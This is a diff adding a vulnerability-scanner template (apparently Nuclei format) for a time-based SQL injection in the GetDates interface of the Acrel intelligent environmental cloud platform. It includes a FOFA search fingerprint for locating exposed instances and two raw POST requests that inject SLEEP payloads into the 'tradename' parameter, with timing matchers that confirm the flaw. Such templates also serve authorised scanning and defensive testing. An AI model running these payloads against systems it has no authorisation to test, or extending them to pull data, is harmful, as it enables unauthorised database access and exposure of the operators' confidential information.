@@ -1,0 +1,29 @@
+id: acrel-env-cloud-getdates-sqli
+info:
+  name: 安科瑞智能环保云平台 GetDates 接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="myCss/phone.css"
+          安科瑞智能环保云平台为环境监测管理系统，其/MainMonitor/GetEnterpriseInfoMapByDate/GetDates接口存在SQL注入缺陷。攻击者可通过操控参数值注入恶意SQL负载，实现数据库查询操控及敏感数据提取，可能引发未经授权的数据库操作、数据完整性破坏及机密信息暴露。
+  tags: 安科瑞智能环保云平台
+http:
+- raw:
+  - |
+    POST /MainMonitor/GetEnterpriseInfoMapByDate/GetDates HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    DeviceId=1&tradename=1';SELECT SLEEP(5)#
+  - |
+    POST /MainMonitor/GetEnterpriseInfoMapByDate/GetDates HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    DeviceId=1&tradename=1';SELECT SLEEP(8)#
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
